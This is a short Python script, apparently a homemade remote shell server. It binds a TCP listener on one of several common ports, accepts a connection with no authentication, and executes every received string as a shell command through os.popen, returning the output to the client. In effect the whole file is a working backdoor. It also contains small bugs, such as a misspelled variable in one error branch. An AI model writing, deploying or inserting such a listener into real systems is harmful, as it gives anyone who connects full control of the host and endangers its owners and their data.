import socket
import os
import sys

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	IP = s.getsockname()[0]
	s.close()
except OSError:
	IP = '127.0.0.1'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	sock.bind((IP, 8080))
except OSError:
	try:
		sock.bind((IP, 8000))
	except OSError:
		try:
			sock.bind((IP, 8888))
		except OSError:
			try:
				sock.bind((IP, 8008))
			except OSError:
				print('Server is not avaliavle')
print('SERVER running at ' + IP)	
sock.listen(2000)
client, addr=sock.accept()

def autoincrement(var):
	files = os.listdir()
	for i in files:
		if var in i:
			return i 

while True:
	command = (client.recv(1073741824)).decode('utf-8')
	cmd = command.split()
	if cmd[0] == 'cd' :
		try:
			os.chdir(cmd[1])
			client.send(b'true')
		except FileNotFoundError:
			try:
				os.chdir(autoincrement(cmd[1]))
				client.send(b'true')
			except FileNotFoundError:
				client.send(b'No such file in directory')
			except NotADirectoryError:
				client.send(b'This file is not a directory')
		except NotADirectoryError:
			clinet.send(b'This file not a directory')
		except IndexError:
			pass
	else:
		res = os.popen(command).read()
		print(res)
		client.send(bytes(res, 'utf-8'))